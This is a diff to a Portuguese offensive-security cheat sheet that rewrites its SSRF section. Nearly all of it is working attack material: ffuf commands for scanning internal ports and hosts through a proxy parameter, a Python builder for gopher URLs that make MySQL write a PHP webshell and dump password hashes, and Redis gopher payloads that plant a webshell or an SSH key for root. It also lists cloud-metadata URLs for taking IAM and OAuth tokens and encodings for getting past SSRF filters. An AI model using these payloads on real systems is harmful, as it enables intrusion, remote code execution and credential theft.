@@ -923,65 +923,208 @@ filename="....//....//....//var/www/html/shell.php"
 
 ## 🌐 SSRF — Server-Side Request Forgery
 
-> **O que é:** O servidor faz requisições HTTP a um destino controlado pelo atacante. Permite acessar serviços internos, metadados de cloud e bypasses de firewall.
+> **O que é:** O servidor faz requisições de rede a um destino controlado pelo atacante. Permite mapear portas internas, acessar serviços restritos (MySQL, Redis), extrair credenciais de Cloud Metadata e alcançar RCE.
 
-### Payloads básicos
-```
-# Acessar serviços internos
+### Payloads Básicos de Conectividade
+```http
+# Localhost tradicional
 http://127.0.0.1
 http://localhost
 http://0.0.0.0
-http://[::1]          # IPv6 localhost
+http://[::1]
 
-# Acessar outras portas internas
+# Portas internas críticas para validação rápida
+http://127.0.0.1:80
 http://127.0.0.1:8080
 http://127.0.0.1:3306    # MySQL
 http://127.0.0.1:6379    # Redis
+http://127.0.0.1:9000    # FastCGI / PHP-FPM
 http://127.0.0.1:27017   # MongoDB
 http://127.0.0.1:9200    # Elasticsearch
+http://127.0.0.1:11211   # Memcached
 ```
 
-### Cloud Metadata Endpoints
+---
+
+### 📡 SSRF Portscan — Automação e Enumeração Interna
+
+#### 1. Portscan Localhost via ffuf
+Varre portas comuns em `127.0.0.1`. Calibre os filtros (`-fc`, `-fs`, `-ft`) com base no comportamento de porta fechada identificado na aplicação.
+
+```bash
+# Varredura de portas com lista do SecLists filtrando por tempo de resposta ou tamanho
+ffuf -u "http://alvo.com/proxy?url=http://127.0.0.1:FUZZ" \
+     -w /usr/share/seclists/Discovery/Web-Content/common-ports.txt \
+     -mc all \
+     -fc 500 \
+     -t 20 \
+     -v
 ```
-# AWS (IMDSv1)
+
+#### 2. Enumeração de Hosts na Sub-rede Interna (Pivoting de Rede)
+Se o servidor estiver em uma rede Docker (`172.17.0.0/16`) ou intranet (`192.168.1.0/24`), descubra outros IPs ativos:
+
+```bash
+# Fuzzing de IPs na faixa 192.168.1.1 até 254
+seq 1 254 > /tmp/ips.txt
+ffuf -u "http://alvo.com/proxy?url=http://192.168.1.FUZZ:80/" \
+     -w /tmp/ips.txt \
+     -mc 200,301,302,403 \
+     -t 30
+```
+
+---
+
+### 🧲 Protocol Smuggling via Gopher — Explorando MySQL (Porta 3306)
+
+Se o MySQL estiver escutando em `127.0.0.1` e houver um usuário sem senha (ex: `root` padrão em muitos contêineres/labs):
+
+#### 1. Usando a Ferramenta Gopherus
+```bash
+# Instalação e execução do Gopherus
+git clone https://github.com/tarunkant/Gopherus.git
+cd Gopherus
+chmod +x install.sh && sudo ./install.sh
+
+# Gerar payload interativo para MySQL
+gopherus --exploit mysql
+# [?] Give MySQL Username: root
+# [?] Give query to execute: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
+```
+
+#### 2. Script Standalone em Python (Construtor de Pacote MySQL sem Senha)
+Caso o `Gopherus` não esteja disponível na máquina:
+
+```python
+#!/usr/bin/env python3
+# Construtor manual de pacote MySQL não autenticado para Gopher
+import urllib.parse
+
+def build_mysql_gopher(user="root", query="SELECT @@version;"):
+    # 1. Handshake do cliente (Auth Packet)
+    user_bytes = user.encode('utf-8')
+    auth_body = b"\x85\xa6\x03\x00\x00\x00\x00\x01\x08\x00\x00\x00" + b"\x00" * 20
+    auth_body += user_bytes + b"\x00\x00"
+    auth_pkt = len(auth_body).to_bytes(3, 'little') + b"\x01" + auth_body
+
+    # 2. Query Packet (Tipo 0x03)
+    query_bytes = query.encode('utf-8')
+    query_body = b"\x03" + query_bytes
+    query_pkt = len(query_body).to_bytes(3, 'little') + b"\x00" + query_body
+
+    full_payload = auth_pkt + query_pkt
+    encoded = urllib.parse.quote(full_payload)
+    return f"gopher://127.0.0.1:3306/_{encoded}"
+
+# Exemplo: Gerar WebShell via MySQL
+payload = build_mysql_gopher(
+    user="root",
+    query="SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+)
+print("URL SSRF:")
+print(payload)
+```
+
+#### 3. Payloads Típicos para Injeção no MySQL
+- **WebShell via `INTO OUTFILE`:**
+  ```sql
+  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+  ```
+- **Dump de Credenciais de Usuários:**
+  ```sql
+  SELECT user, authentication_string FROM mysql.user INTO OUTFILE '/var/www/html/dump_hashes.txt';
+  ```
+
+---
+
+### 🧲 Protocol Smuggling via Gopher — Redis (Porta 6379)
+
+#### 1. WebShell em Diretório Web
+```bash
+# Envia comandos: FLUSHALL, SET dir, SET dbfilename, SET shell, SAVE
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$31%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
+```
+
+#### 2. Injeção de Chave Pública SSH (Root)
+```bash
+# Injeta chave pública em /root/.ssh/authorized_keys
+gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0assh%0d%0a$48%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2E... seu-email%0a%0a%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
+```
+
+---
+
+### ☁️ Cloud Metadata Endpoints
+
+#### AWS (Amazon Web Services)
+```bash
+# IMDSv1 — Leitura de Roles e Credenciais Temporárias
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_DA_ROLE
 http://169.254.169.254/latest/user-data/
 
-# GCP
-http://metadata.google.internal/computeMetadata/v1/
-# (Requer header: Metadata-Flavor: Google)
-
-# Azure
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-# (Requer header: Metadata: true)
-
-# DigitalOcean
-http://169.254.169.254/metadata/v1/
+# IMDSv2 — Requer geração de Token via PUT (quando há controle de cabeçalhos/método)
+# 1. Gerar token:
+# curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# 2. Consultar:
+# curl -H "X-aws-ec2-metadata-token: TOKEN" "http://169.254.169.254/latest/meta-data/"
 ```
 
-### Bypass de filtros de SSRF
-```
-# Bypass de blacklist de "localhost" e "127.0.0.1"
-http://2130706433         # 127.0.0.1 em decimal
-http://0x7f000001         # 127.0.0.1 em hex
-http://017700000001       # 127.0.0.1 em octal
-http://127.1              # Shorthand
-http://127.0.0.1.nip.io   # DNS rebinding via nip.io
-http://0                  # Resolve para 0.0.0.0
-
-# Bypass via redirect
-# Hospedar em SEU-SERVIDOR um redirect 302 para http://127.0.0.1
-
-# Bypass via URL parsing
-http://evil.com@127.0.0.1
-http://127.0.0.1#@evil.com
-```
-
-### SSRF → RCE (via serviços internos)
+#### Google Cloud Platform (GCP)
 ```bash
-# Redis (porta 6379) — Escrever webshell via protocolo Redis
-gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$11%0d%0ashell_value%0d%0a$31%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
+# Requer cabeçalho HTTP: "Metadata-Flavor: Google"
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+#### Microsoft Azure
+```bash
+# Requer cabeçalho HTTP: "Metadata: true"
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+```
+
+#### DigitalOcean & Kubernetes
+```bash
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
+
+# Kubernetes Kubelet API
+https://127.0.0.1:10250/pods
+http://127.0.0.1:10255/pods
+```
+
+---
+
+### 🛡️ Bypasses de Filtros de SSRF
+
+```bash
+# 1. Representações Numéricas de 127.0.0.1
+http://2130706433/        # Decimal
+http://0x7f000001/        # Hexadecimal
+http://017700000001/      # Octal
+http://127.1/             # Shorthand (omite zeros intermediários)
+http://0/                 # Resolve para 0.0.0.0 (localhost no Linux)
+
+# 2. IPv6
+http://[::1]/
+http://[::]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# 3. DNS Wildcard & Rebinding
+http://127.0.0.1.nip.io/
+http://localtest.me/
+# Rebinding com TTL=0 (utilizando rbndr.us ou ferramentas customizadas)
+
+# 4. URL Parsing Inconsistencies (Bypass de regex com @, #, ?)
+http://alvo-confiavel.com@127.0.0.1/
+http://127.0.0.1#alvo-confiavel.com
+http://127.0.0.1?.alvo-confiavel.com
+http://alvo-confiavel.com:80@127.0.0.1/
+
+# 5. Open Redirect Chaining
+# Se o backend valida apenas o domínio "empresa.com", mas existe um redirect aberto lá:
+http://alvo.com/preview?url=https://empresa.com/redirect?to=http://127.0.0.1:3306
 ```
 
 ---
